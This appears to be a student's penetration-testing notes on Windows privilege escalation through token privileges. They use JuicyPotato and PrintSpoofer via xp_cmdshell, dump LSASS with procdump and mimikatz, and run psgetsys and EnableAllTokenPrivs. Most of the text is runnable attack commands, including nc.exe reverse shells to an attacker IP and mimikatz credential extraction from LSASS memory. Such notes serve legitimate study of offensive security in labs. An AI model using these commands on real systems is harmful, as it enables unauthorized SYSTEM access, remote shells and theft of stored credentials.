## SeImpersonate Example - JuicyPotato

Scenario:
    Gaining foothold on SQL Server using privileged SQL user.

    - Achieve RCE using `xp_cmdshell` using creds from `logins.sql`
    - Connect with MSSQLClient.py
```bash
    mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

    - Enabling xp_cmdshell
    - `xp_cmdshell whoami /priv`
    - Drop JuicyPotato.exe and nc.exe onto the target
```
    xp_cmdshell c:\tools\Juicypotato.exe -l 53375 c:\windows\system32\cmd.exe 
        -a "/c c:\tools\nc.exe 10.10.14.3 -e cmd.exe" -t *
```

### Print Spoofer and RoguePotato

JuicyPotato doesn't work on WinServer 2019/Win10 build 1809 and newer.
However, PrintSpoofer and RoguePotato can be used.

PrintSpoofer can spawn a SYSTEM process in your current console.
```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

## SeDebugPrivilege

`Sysinternals Suite` has `ProcDump` which can dump process memory.
```
whoami /priv -> SeDebugPrivilege (Enabled)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe -> log -> sekurlsa::mimidump lsass.dump
sekurlsa::logonpasswords -> 

Or manually from Desktop:

Task Manager -> Details -> R-Click(lsass.exe) -> Create Dump File
```

## RCE as SYSTEM with SeDebugPrivilege

Using a child-process using the elevated Debug rights.
The main idea is that the user in question has RCE and also has `SeDebugPrivilege`

- Transfer this script: 
	https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
	`tasklist` -> `winlogon.exe`
- Load the script with args-> 
	;  `[MyProcess]::CreateProcessFromParent(<system_pid>,<command>,"")`
- Or with `[MyProcess]::CreateProcessFromParent((Get-Process "lsass").Id,"cmd.exe",""`

## SeTakeOwnershipPrivilege

This privilege assigns `WRITE_OWNER` rights over any securable object.

- `whoami /priv`
- Drop this script onto the target:
	https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
- `Import-Module .\Enable-Privilege.ps1`
- `.\EnableAllTokenPrivs.ps1`

